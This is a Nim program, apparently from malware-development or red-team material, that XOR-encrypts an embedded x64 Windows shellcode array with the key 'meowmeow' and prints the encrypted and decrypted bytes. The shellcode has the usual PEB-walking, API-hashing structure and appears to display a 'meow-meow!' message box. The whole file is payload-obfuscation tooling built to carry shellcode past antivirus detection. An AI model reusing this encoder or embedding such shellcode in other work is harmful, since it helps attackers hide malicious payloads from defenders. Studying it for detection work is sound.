import strutils

proc xorEnc(data: seq[byte], key: seq[byte]): seq[byte] =
    var enc: seq[byte]
    for i in 0 ..< len(data):
        enc.add(data[i] xor key[i mod len(key)])
    result = enc

when isMainModule:
    let payload: seq[byte] = @[
    byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,
    0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
    0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
    0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
    0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
    0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
    0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
    0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
    0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
    0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
    0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
    0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
    0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
    0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,
    0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x09,0x01,0x00,0x00,0x48,
    0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
    0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6d,0x65,0x6f,
    0x77,0x2d,0x6d,0x65,0x6f,0x77,0x21,0x00,0x63,0x61,0x74,0x00
    ]
    let key: seq[byte] = @[0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77]

    let enc = xorEnc(payload, key)
    var enchex: seq[string]
    for b in enc:
        enchex.add("0x" & $toHex(b, 2))
    echo "payload encrypted:\n", enchex.join(", ")

    let decr = xorEnc(enc, key)
    var decrhex: seq[string]
    for b in decr:
        decrhex.add("0x" & $toHex(b, 2))
    echo "original payload:\n", decrhex.join(", ")
